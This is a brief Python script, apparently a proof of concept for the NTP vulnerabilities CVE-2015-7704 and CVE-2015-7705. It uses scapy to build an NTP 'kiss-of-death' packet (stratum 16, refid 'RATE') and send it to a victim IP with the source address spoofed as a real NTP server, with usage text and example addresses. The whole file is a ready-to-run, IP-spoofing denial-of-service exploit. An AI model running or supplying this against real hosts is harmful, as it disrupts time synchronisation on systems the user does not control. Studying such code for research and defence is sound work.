import struct
import random

from scapy.all import *

"""
CVE-2015-7704, CVE-2015-7705 PoC

- https://bugzilla.redhat.com/show_bug.cgi?id=1271070
- http://www.cs.bu.edu/~goldbe/NTPattack.html
"""

def usage():
   print "usage  : "+sys.argv[0] + " <victim_ip>  [victim_port] <server_ip>" 
   print "example: "+sys.argv[0] + " 192.168.208.196 123 203.248.240.140" 

if len(sys.argv) != 4:
   usage()
   sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])
server = str(sys.argv[3])

p_xmt = random.randint(1, 100)

data = struct.pack('B', 0xd4) # hisleap, version, hismode
data += struct.pack('B', 0x10) # hisstratum
data += struct.pack('10s', 'g' * 10) # garbage
data += struct.pack('4s', 'RATE') # refid 
data += struct.pack('32s', chr(p_xmt) * 32) # transmit timestampe, and others ..

# spoofing src ip addr with time.bora.net ex) 203.248.240.140(time.bora.net)
send(IP(src=server, dst=host)/UDP(sport=123, dport=port)/data)
